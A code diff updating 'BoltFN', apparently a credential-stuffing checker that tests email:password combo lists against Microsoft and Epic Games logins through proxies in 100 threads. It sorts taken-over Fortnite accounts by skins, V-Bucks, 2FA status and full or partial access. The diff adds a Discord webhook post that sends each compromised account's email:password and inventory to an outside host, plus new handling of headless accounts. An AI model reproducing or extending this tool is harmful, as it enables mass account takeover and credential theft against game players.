@@ -24,14 +24,14 @@ from threading import Thread
 from time import sleep, strftime, gmtime
 import urllib3
 import urllib
-from discord_webhook import DiscordWebhook
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 
 init()
 default_values = '''checker:
-  print_fail: true
+  print_fail: false
+  print_ms_hit: false
   retries: 1
   timeout: 10000
   threads: 100
@@ -85,6 +85,9 @@ class counter:
 
 
 class Counter:
+    og = 0
+    stw = 0
+    headless = 0
     skins_data = []
     xb = 0
     custom = 0
@@ -117,7 +120,7 @@ class Main:
         self.created = str(strftime('-[%m-%d-%Y %H-%M-%S]'))
         self.domain_list = self.lisr()
         disable_warnings()
-        self.version = '1.1'
+        self.version = '1.15'
         self.printing = Queue()
         self.caputer = Queue()
         self.start_time = 0
@@ -407,11 +410,34 @@ class Main:
             system('cls')
             Main()
         checkname = input(f'{Fore.LIGHTCYAN_EX}Name for the check: ')
-        lol = input('Would you like to use CUIMode? y/n: ')
-        if 'y' == lol:
-            self.cuimode = 'y'
-        else:
-            self.cuimode = 'n'
+        while True:
+            try:
+                lol = input(f'{Fore.LIGHTCYAN_EX}Display mode? cui/log: ')
+                if 'cui' == lol.lower():
+                    self.cuimode = 'y'
+                    break
+                elif 'log' == lol.lower():
+                    self.cuimode = 'n'
+                    break
+                else:
+                    print(f'{Fore.RED}Invalid input')
+            except:
+                print(f'{Fore.RED}Invalid input')
+        if self.cuimode == 'y':
+            while True:
+                try:
+                    lol = input(f'{Fore.LIGHTCYAN_EX}CUI mode? cn/nexus: ')
+                    if lol.lower() == 'cn':
+                        self.cuitype = 'cn'
+                        break
+                    elif lol.lower() == 'nexus':
+                        self.cuitype = 'nexus'
+                        break
+                    else:
+                        print(f'{Fore.RED}Invalid input')
+                except:
+                    print(f'{Fore.RED}Invalid input')
+
         system('cls')
         print(self.t)
         print("")
@@ -550,6 +576,7 @@ class Main:
             print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
         except:
             self.proxylist = []
+            print('\n')
         if 'y' == self.cuimode:
             Thread(target=self.Refreshconsole, daemon=False).start()
         with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
@@ -713,7 +740,8 @@ class Main:
                                                     if retr >= Checker.retries:
                                                         Counter.mshit+=1
                                                         if 'n' == self.cuimode:
-                                                            self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
+                                                            if Checker.printms:
+                                                                self.prints(f'{Fore.YELLOW}[MS-HIT] - {line}')
                                                         if not os.path.exists(self.folder + '/Microsoft'):
                                                             os.makedirs(self.folder + '/Microsoft')
                                                         open(f'{self.folder}/Microsoft/Hits.txt', 'a',
@@ -786,21 +814,33 @@ class Main:
                                         while True:
                                             try:
                                                 response = scraper.post(url, json=payload, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
-                                                if 'message":"Two-Factor authentication' in response.text or 'Please update your account with display name and email specified.' in response.text:
+                                                if 'message":"Two-Factor authentication' in response.text :
                                                     Counter.mshit+=1
                                                     Counter.epic2fa+=1
                                                     if 'n' == self.cuimode:
-                                                        self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
+                                                        self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
                                                     if not os.path.exists(self.folder + '/Microsoft'):
                                                         os.makedirs(self.folder + '/Microsoft')
                                                     open(f'{self.folder}/Microsoft/2fa.txt', 'a',
                                                     encoding='u8').write(f'{line}\n')
                                                     return
+                                                elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
+                                                    Counter.hits+=1
+                                                    Counter.headless+=1
+                                                    if 'n' == self.cuimode:
+                                                        self.prints(f'{Fore.GREEN}[HIT][HEADLESS] - {line}')
+                                                    if not os.path.exists(self.folder + '/NoCapture'):
+                                                        os.makedirs(self.folder + '/NoCapture')
+                                                    open(f'{self.folder}/NoCapture/headless.txt', 'a',
+                                                    encoding='u8').write(f'{line}\n')
+                                                    return
+                                                        
                                                 elif 'DATE_OF_BIRTH' in response.text or 'message":"No account was found to log you in' in response.text:
                                                     Counter.mshit+=1
                                                     Counter.xb +=1
                                                     if 'n' == self.cuimode:
-                                                        self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
+                                                        if Checker.printms:
+                                                            self.prints(f'{Fore.YELLOW}[MS-HIT][XBOX] - {line}')
                                                     if not os.path.exists(self.folder + '/Microsoft'):
                                                         os.makedirs(self.folder + '/Microsoft')
                                                     open(f'{self.folder}/Microsoft/Xbox.txt', 'a',
@@ -874,20 +914,22 @@ class Main:
                                                 response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                 if 'Sorry, your account has too many active logins' in response.text:
                                                         Counter.hits+=1
+                                                        if 'n' == self.cuimode:
+                                                            self.prints(f'{Fore.GREEN}[HIT][NC] - {line}')
                                                         if not os.path.exists(self.folder + '/NoCapture'):
                                                             os.makedirs(self.folder + '/NoCapture')
                                                         open(f'{self.folder}/NoCapture/logins.txt', 'a',
                                                         encoding='u8').write(f'{line}\n')
                                                         return
-                                                if '"sid":null,' in response.text or 'Please fill your real email' in response.text:
+                                                elif '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                                                     if ret >= Checker.retries:
                                                         Counter.mshit+=1
                                                         Counter.epic2fa+=1
                                                         if 'n' == self.cuimode:
-                                                            self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
+                                                            self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
                                                         if not os.path.exists(self.folder + '/Microsoft'):
                                                             os.makedirs(self.folder + '/Microsoft')
-                                                        open(f'{self.folder}/Microsoft/2fa.txt', 'a',
+                                                        open(f'{self.folder}/Microsoft/2fa2.txt', 'a',
                                                         encoding='u8').write(f'{line}\n')
                                                         return
                                                     else:
@@ -974,6 +1016,8 @@ class Main:
                                                     }
                                                     response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                     if 'Sorry, your account has too many active logins' in response.text:
+                                                        if 'n' == self.cuimode:
+                                                            self.prints(f'{Fore.GREEN}[HIT][NC] - {line}')
                                                         Counter.hits+=1
                                                         if not os.path.exists(self.folder + '/NoCapture'):
                                                             os.makedirs(self.folder + '/NoCapture')
@@ -982,9 +1026,9 @@ class Main:
                                                         return
                                                     if '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                                                             Counter.mshit+=1
-                                                            Counter.epic2fa+=1
+                                                            Counter.epic2fa
                                                             if 'n' == self.cuimode:
-                                                                self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
+                                                                self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
                                                             if not os.path.exists(self.folder + '/Microsoft'):
                                                                 os.makedirs(self.folder + '/Microsoft')
                                                             open(f'{self.folder}/Microsoft/2fa.txt', 'a',
@@ -1275,6 +1319,7 @@ class Main:
                                                     continue  
                                             try:
                                                 if "tutorial" in str(data):
+                                                    Counter.stw+=1
                                                     has_stw = "YES"
                                                 else:
                                                     has_stw = "NO"
@@ -1316,7 +1361,7 @@ class Main:
                                             first_active_season = None
                                             for season in past_seasons:
                                                 try:
-                                                    if season['numWins'] > 0:
+                                                    if season['seasonXp'] > 0:
                                                         if first_active_season is None or season['seasonNumber'] < first_active_season['seasonNumber']:
                                                             first_active_season = season
                                                 except:
@@ -1341,24 +1386,22 @@ class Main:
                                                             found = False
                                                             skin_id = value.split("AthenaCharacter:")[1]
                                                             for linee in localSkins:
-                                                                if linee.split(':')[0] == skin_id:
+                                                                if linee.split(':')[0].lower() == skin_id.lower():
                                                                     found = True
                                                                     skinName = linee.split(':')[1]
                                                             if not found:
                                                                 while True:
                                                                     try:
-                                                                        url = f'https://fn-db.com/outfit/{skin_id}'
-                                                                        skin_name = requests.get(url, proxies=self.proxies(), timeout=Checker.timeout)
-                                                                        if '<h1 class="font-weight-bold">' in skin_name.text:
-                                                                            soup = BeautifulSoup(skin_name.text, 'html.parser')
-                                                                            japanese_text = soup.h1.get_text()
-                                                                            skinName = GoogleTranslator(source='ja', target='en').translate(japanese_text)
+                                                                        url = f'https://fortnite-api.com/v2/cosmetics/br/{skin_id}'
+                                                                        r = requests.get(url, proxies=self.proxies(), timeout=Checker.timeout).json()
+                                                                        if r['status'] == 200:
+                                                                            skinName = r['data']['name']
                                                                             with open('skins_database.txt', 'a') as file:
-                                                                                file.write(f'{skin_id}:{skinName.lower()}' + '\n')
+                                                                                file.write(f'{skin_id}:{skinName}' + '\n')
                                                                             break
                                                                         else:
-                                                                            skinName = skin_id
-                                                                            break
+                                                                            Counter.retries+=1
+                                                                            continue
                                                                     except Exception as e:
                                                                         Counter.retries +=1
                                                                         continue
@@ -1373,12 +1416,12 @@ class Main:
                                             total_skins = len(unique_skins)
                                             processed_skins = [skin.replace("character_speeddial", "").strip() for skin in unique_skins]
                                             exclusiveSkins = [
-                                                                'black knight','chun-li', 'huntmaster saber', 'the reaper', 'blue squire', 
-                                                                'royale knight', 'sparkle specialist', 'gold brutus', 'omega', 
-                                                                'gold midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
-                                                                'strong guard', 'rose team leader', 'warpaint', 'travis', 
-                                                                'eddie brock', 'master chief'
-                                                            ]
+                                                'black knight','chun-li', 'huntmaster saber', 'the reaper', 'blue squire', 
+                                                'royale knight', 'sparkle specialist', 'gold brutus', 'omega', 
+                                                'gold midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
+                                                'strong guard', 'rose team leader', 'warpaint', 'travis', 
+                                                'eddie brock', 'master chief', 'fresh', 'aerial assault trooper', 'ikonik'
+                                            ]
                                             for skin in processed_skins:
                                                 if skin.lower() in exclusiveSkins:
                                                    exclusive = True
@@ -1443,7 +1486,7 @@ class Main:
                                                 Total_VBucks = 'Error'
                                             if 'n' == self.cuimode:
                                                 self.prints(
-                                                f'{Fore.GREEN}[FN-HIT]' +
+                                                f'{Fore.GREEN}[HIT]' +
                                                 ('[FA]' if epicEmail.lower() == email.lower() else '[NFA]') +
                                                 (f'[S:{total_skins}]' if int(total_skins) > 0 else '') +
                                                 (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
@@ -1451,6 +1494,11 @@ class Main:
                                                 (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') +
                                                 f' - {line}'
                                                 )
+                                            try:
+                                                if int(first_active_season.strip()) <= 4:
+                                                    Counter.og +=1
+                                            except:
+                                                pass
                                             fullAccess = 'NFA'
                                             if epicEmail == email:
                                                 fullAccess = 'FA'
@@ -1476,6 +1524,42 @@ class Main:
                                             if exclusive: message+=f"\nExclusive Skins List: {exclusiveSkin}"
                                             if processed_skins != None: message+=f"\nSkins List: {processed_skins}"
                                             message = message+"\n============================\n"
+                                            if not exclusive:
+                                                exclusiveskins = 0
+                                                exclusiveSkin = ''
+                                            else:
+                                                exclusiveskins = len(exclusiveSkin)
+                                            if not total_skins > 0:
+                                                processed_skins = 0
+                                            if Checker.webhook.webhooky:
+                                                payload = {
+                                                        "username": "BOLTFN",
+                                                        "avatar_url": f"https://fortnite-api.com/images/cosmetics/br/character_quickburst_plains/icon.png",
+                                                        "embeds": [
+                                                            {
+                                                            "author": {"name": "BOLTFN", "url": "https://github.com/Shaggymop/BoltFN", "icon_url": "https://cdn-icons-png.flaticon.com/512/25/25231.png"},
+                                                            "title": display_name,
+                                                            "color": 15054874,
+                                                            "fields": [
+                                                                {"name": "Email:Password", "value": f"||{email}:{password}||"},
+                                                                {"name": "Wins", "value": total_wins},
+                                                                {"name": "Level", "value": level},
+                                                                {"name": "Vbucks", "value": Total_VBucks},
+                                                                {"name": "Backblings", "value": total_backpacks},
+                                                                {"name": "Pickaxes", "value": total_pickaxes},
+                                                                {"name": "Gliders", "value": total_gliders},
+                                                                {"name": "Emotes", "value": total_dances},
+                                                                {"name": "2FA", "value": tfa_enabled},
+                                                                {"name": "Save The World", "value": has_stw},
+                                                                {"name": "Exclusive Skins", "value": f'[{exclusiveskins}] {exclusiveSkin}'},
+                                                                {"name": "Skins", "value": f'[{total_skins}] {processed_skins}'},
+                                                                {"name": "Account Type", "value": fullAccess}
+                                                            ],
+                                                            "footer": {"text": "MSFN", "icon_url": "https://cdn-icons-png.flaticon.com/512/25/25231.png"}
+                                                            }
+                                                        ]
+                                                }
+                                                r = requests.post(Checker.webhook.webhookid, json=payload)
                                             if exclusive == True:
                                                 if not os.path.exists(self.folder + '/Fortnite/Exclusive'):
                                                     os.makedirs(self.folder + '/Fortnite/Exclusive')
@@ -1557,8 +1641,9 @@ class Main:
                             return
                         elif result == '2FACTOR':
                             Counter.custom+=1
-                            if 'n' == self.cuimode:
-                                    self.prints(f'{Fore.RED}[2FA] - {line}')
+                            if Checker.printbadd:
+                                if 'n' == self.cuimode:
+                                        self.prints(f'{Fore.RED}[2FA] - {line}')
                             if Checker.save_bad:
                                 if not os.path.exists(self.folder + '/Bad'):
                                     os.makedirs(self.folder + '/Bad')
@@ -1567,8 +1652,9 @@ class Main:
                             return
                         elif result == 'Ban':
                             Counter.custom+=1
-                            if 'n' == self.cuimode:
-                                    self.prints(f'{Fore.RED}[2FA] - {line}')
+                            if Checker.printbadd:
+                                if 'n' == self.cuimode:
+                                        self.prints(f'{Fore.RED}[2FA] - {line}')
                             if Checker.save_bad:
                                 if not os.path.exists(self.folder + '/Bad'):
                                     os.makedirs(self.folder + '/Bad')
@@ -1577,8 +1663,9 @@ class Main:
                             return
                         elif result == 'CUSTOM':
                             Counter.locked+=1
-                            if 'n' == self.cuimode:
-                                    self.prints(f'{Fore.RED}[LOCKED] - {line}')
+                            if Checker.printbadd:
+                                if 'n' == self.cuimode:
+                                        self.prints(f'{Fore.RED}[LOCKED] - {line}')
                             if Checker.save_bad:
                                 if not os.path.exists(self.folder + '/Bad'):
                                     os.makedirs(self.folder + '/Bad')
@@ -1590,11 +1677,11 @@ class Main:
                                 if Checker.printbadd:
                                     if 'n' == self.cuimode:
                                         self.prints(f'{Fore.RED}[BAD] - {line}')
-                                    if Checker.save_bad:
-                                        if not os.path.exists(self.folder + '/Bad'):
-                                            os.makedirs(self.folder + '/Bad')
-                                        open(f'{self.folder}/Bad/Unknown.txt', 'a',
-                                            encoding='u8').write(f'{line}\n')
+                                if Checker.save_bad:
+                                    if not os.path.exists(self.folder + '/Bad'):
+                                        os.makedirs(self.folder + '/Bad')
+                                    open(f'{self.folder}/Bad/Unknown.txt', 'a',
+                                        encoding='u8').write(f'{line}\n')
                                 return
             else:
                 Counter.bad+=1
@@ -1741,6 +1828,7 @@ class Main:
                 Counter.checkedpercent = round((chek / Total) * 100, 2)
                 Counter.failedpercent = round(badd, 2)
                 Counter.hitspercent = round((int(Counter.hits) / Total) * 100, 2)
+                Counter.headlesspercent = round((int(Counter.headless) / Total) * 100, 2)
                 cust = Counter.custom + Counter.locked
                 Counter.custompercent =round(number=(cust / Total * 100), ndigits=2)
                 Counter.mshitspercent = round((int(Counter.mshit) / Total) * 100, 2)
@@ -1750,6 +1838,7 @@ class Main:
                     f"BoltFN | v{self.version}"
                     f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked}/{Total} ({Counter.checkedpercent}%)"
                     f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
+                    f" | Headless: {Counter.headless} ({Counter.hitspercent}%)"
                     f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
                     f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
                     f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
@@ -1786,118 +1875,197 @@ class Main:
         lock.acquire()
         print(f'{line}')
         lock.release()
-
-    def webhooksend(self, line):
-        webhooksent = 0
-        while True:
-            webhook = DiscordWebhook(
-                url=f'{Checker.webhook.webhookid}', content=f'{line}')
-            response = webhook.execute()
-            webhooksent += 1
-            if webhooksent > 3:
-                sleep(5)
-
     def Refreshconsole(self):
         while True:
             try:
                 time.sleep(1)
-                categories = {
-                    "Exclusive": {"FA": 0, "NFA": 0},
-                    "300+ Skins": {"FA": 0, "NFA": 0},
-                    "200-299 Skins": {"FA": 0, "NFA": 0},
-                    "100-199 Skins": {"FA": 0, "NFA": 0},
-                    "50-99 Skins": {"FA": 0, "NFA": 0},
-                    "10-49 Skins": {"FA": 0, "NFA": 0},
-                    "1-9 Skins": {"FA": 0, "NFA": 0},
-                    "0 Skins": {"FA": 0, "NFA": 0}
-                }
-                for data in Counter.skins_data:
-                    fullAccess = data["fullAccess"]
-                    total_skins = data["total_skins"]
-                    exclusive = data['exclusive']
-                    if exclusive:
-                        categories["Exclusive"][fullAccess] += 1
-                    elif 300 <= total_skins:
-                        categories["300+ Skins"][fullAccess] += 1
-                    elif 200 <= total_skins <= 299:
-                        categories["200-299 Skins"][fullAccess] += 1
-                    elif 100 <= total_skins <= 199:
-                        categories["100-199 Skins"][fullAccess] += 1
-                    elif 50 <= total_skins <= 99:
-                        categories["50-99 Skins"][fullAccess] += 1
-                    elif 10 <= total_skins <= 49:
-                        categories["10-49 Skins"][fullAccess] += 1
-                    elif 1 <= total_skins <= 9:
-                        categories["1-9 Skins"][fullAccess] += 1
-                    elif total_skins == 0:
-                        categories["0 Skins"][fullAccess] += 1
+                if self.cuitype == 'cn':
+                    logo_colored = [
+                        f"                {Fore.GREEN}██████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╗{Fore.GREEN} ██{Fore.CYAN}╗{Fore.GREEN}  ████████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN}██████{Fore.CYAN}╗",
+                        f"                {Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╔═══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}║  ╚══{Fore.GREEN}██{Fore.CYAN}╔══╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN} ██{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗",
+                        f"                {Fore.GREEN}██████{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}║    {Fore.GREEN} ██{Fore.CYAN}║  {Fore.GREEN} ██{Fore.CYAN}║{Fore.GREEN}     ███████{Fore.CYAN}║{Fore.GREEN}█████{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}║    {Fore.GREEN} █████{Fore.CYAN}╔╝{Fore.GREEN} █████{Fore.CYAN}╗  {Fore.GREEN}██████{Fore.CYAN}╔╝",
+                        f"                {Fore.CYAN}██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN} ██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║    {Fore.CYAN} ██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}╔══╝  {Fore.CYAN}██{Fore.GREEN}║     {Fore.CYAN}██{Fore.GREEN}╔═{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN} ██{Fore.GREEN}╔══╝ {Fore.CYAN} ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗",
+                        f"                {Fore.CYAN}██████{Fore.GREEN}╔╝╚{Fore.CYAN}██████{Fore.GREEN}╔╝{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║   ╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║ {Fore.CYAN} ██{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║",
+                        f"                {Fore.GREEN}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
+                    ]
+                    total_chars = sum(line.count('█') + line.count('╔') + line.count('╗') + line.count('╚') + line.count('═') + line.count('║') for line in logo_colored)
+                    chars_to_color = total_chars if Counter.checkedpercent >= 100 else int(round(total_chars * Counter.checkedpercent / 100))
 
-                tree = categories
-                total_hits = sum(counts["FA"] + counts["NFA"] for counts in tree.values())
-                logo_colored = [
-                    f"                {Fore.GREEN}██████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╗{Fore.GREEN} ██{Fore.CYAN}╗{Fore.GREEN}  ████████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN}██████{Fore.CYAN}╗",
-                    f"                {Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╔═══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}║  ╚══{Fore.GREEN}██{Fore.CYAN}╔══╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN} ██{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗",
-                    f"                {Fore.GREEN}██████{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}║    {Fore.GREEN} ██{Fore.CYAN}║  {Fore.GREEN} ██{Fore.CYAN}║{Fore.GREEN}     ███████{Fore.CYAN}║{Fore.GREEN}█████{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}║    {Fore.GREEN} █████{Fore.CYAN}╔╝{Fore.GREEN} █████{Fore.CYAN}╗  {Fore.GREEN}██████{Fore.CYAN}╔╝",
-                    f"                {Fore.CYAN}██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN} ██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║    {Fore.CYAN} ██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}╔══╝  {Fore.CYAN}██{Fore.GREEN}║     {Fore.CYAN}██{Fore.GREEN}╔═{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN} ██{Fore.GREEN}╔══╝ {Fore.CYAN} ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗",
-                    f"                {Fore.CYAN}██████{Fore.GREEN}╔╝╚{Fore.CYAN}██████{Fore.GREEN}╔╝{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║   ╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║ {Fore.CYAN} ██{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║",
-                    f"                {Fore.GREEN}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
-                ]
-                total_chars = sum(line.count('█') + line.count('╔') + line.count('╗') + line.count('═') + line.count('║') for line in logo_colored)
-                chars_to_color = int(round(total_chars * Counter.checkedpercent / 100))
+                    colored_logo = ""
+                    colored_count = 0
 
-                colored_logo = ""
-                colored_count = 0
-
-                for line in logo_colored:
-                    colored_line = ""
-                    for char in line:
-                        if char in '█╔╗═║╚' and colored_count < chars_to_color:
-                            colored_line += char  
-                            colored_count += 1
-                        else:
-                            if char in '█╔╗═║╚':
-                                colored_line += Fore.LIGHTWHITE_EX + char + colorama.Style.RESET_ALL
+                    for line in logo_colored:
+                        colored_line = ""
+                        for char in line:
+                            if char in '█╔╗═║╚' and colored_count < chars_to_color:
+                                colored_line += char  
+                                colored_count += 1
                             else:
-                                colored_line += char 
-                    colored_logo += colored_line + "\n"
+                                if char in '█╔╗═║╚':
+                                    colored_line += Fore.LIGHTWHITE_EX + char + colorama.Style.RESET_ALL
+                                else:
+                                    colored_line += char 
+                        colored_logo += colored_line + "\n"
+                    system('cls')
+                    print(colored_logo)
+                    categories = {
+                        "Exclusive": {"FA": 0, "NFA": 0},
+                        "300+ Skins": {"FA": 0, "NFA": 0},
+                        "200-299 Skins": {"FA": 0, "NFA": 0},
+                        "100-199 Skins": {"FA": 0, "NFA": 0},
+                        "50-99 Skins": {"FA": 0, "NFA": 0},
+                        "10-49 Skins": {"FA": 0, "NFA": 0},
+                        "1-9 Skins": {"FA": 0, "NFA": 0},
+                        "0 Skins": {"FA": 0, "NFA": 0}
+                    }
+                    for data in Counter.skins_data:
+                        fullAccess = data["fullAccess"]
+                        total_skins = data["total_skins"]
+                        exclusive = data['exclusive']
+                        if exclusive:
+                            categories["Exclusive"][fullAccess] += 1
+                        elif 300 <= total_skins:
+                            categories["300+ Skins"][fullAccess] += 1
+                        elif 200 <= total_skins <= 299:
+                            categories["200-299 Skins"][fullAccess] += 1
+                        elif 100 <= total_skins <= 199:
+                            categories["100-199 Skins"][fullAccess] += 1
+                        elif 50 <= total_skins <= 99:
+                            categories["50-99 Skins"][fullAccess] += 1
+                        elif 10 <= total_skins <= 49:
+                            categories["10-49 Skins"][fullAccess] += 1
+                        elif 1 <= total_skins <= 9:
+                            categories["1-9 Skins"][fullAccess] += 1
+                        elif total_skins == 0:
+                            categories["0 Skins"][fullAccess] += 1
 
-                system('cls')
+                    tree = categories
+                    total_hits = sum(counts["FA"] + counts["NFA"] for counts in tree.values())
 
-                c = f"{colored_logo}"
-                print(c)
+                    print(f'                                                {Fore.WHITE}[Progress: {Counter.checkedpercent:.2f}%{Fore.WHITE}]\n\n')
+                    print(f"{Fore.WHITE}[{Counter.bad + Counter.custom + Counter.locked}] {Fore.RED}Bad")
+                    print(f" {Fore.WHITE}├── [{Counter.bad}] {Fore.YELLOW}Invalid")
+                    print(f" {Fore.WHITE}├── [{Counter.locked}] {Fore.YELLOW}Locked")
+                    print(f" {Fore.WHITE}└── [{Counter.custom}] {Fore.YELLOW}2FA")
+                    print(f"{Fore.WHITE}[{Counter.mshit}] {Fore.GREEN}MS-Hit")
+                    print(f" {Fore.WHITE}├── [{Counter.headless}] {Fore.GREEN}Headless")
+                    print(f" {Fore.WHITE}├── [{Counter.mshit - Counter.fnban - Counter.epic2fa - Counter.xb - Counter.headless}] {Fore.YELLOW}Not linked")
+                    print(f" {Fore.WHITE}├── [{Counter.epic2fa}] {Fore.YELLOW}2FA")
+                    print(f" {Fore.WHITE}├── [{Counter.xb}] {Fore.YELLOW}Xbox")
+                    print(f" {Fore.WHITE}└── [{Counter.fnban}] {Fore.YELLOW}Banned")
+                    print(f"{Fore.WHITE}[{total_hits}] {Fore.GREEN}Hit")
+                    category_list = list(tree.items())  
+                    last_category_idx = len(category_list) - 1
+                    for idx, (category, counts) in enumerate(category_list):
+                        fa_count = counts['FA']
+                        nfa_count = counts['NFA']
+                        total_count = fa_count + nfa_count
 
-                print(f'                                                {Fore.WHITE}[Progress: {Counter.checkedpercent:.2f}%{Fore.WHITE}]\n\n')
-                print(f"{Fore.WHITE}[{Counter.bad + Counter.custom + Counter.locked}] {Fore.RED}Bad")
-                print(f" {Fore.WHITE}├── [{Counter.bad}] {Fore.YELLOW}Invalid")
-                print(f" {Fore.WHITE}├── [{Counter.locked}] {Fore.YELLOW}Locked")
-                print(f" {Fore.WHITE}└── [{Counter.custom}] {Fore.YELLOW}2FA")
-                print(f"{Fore.WHITE}[{Counter.mshit}] {Fore.GREEN}MS-Hit")
-                print(f" {Fore.WHITE}├── [{Counter.mshit - Counter.fnban - Counter.epic2fa - Counter.xb}] {Fore.YELLOW}Not linked")
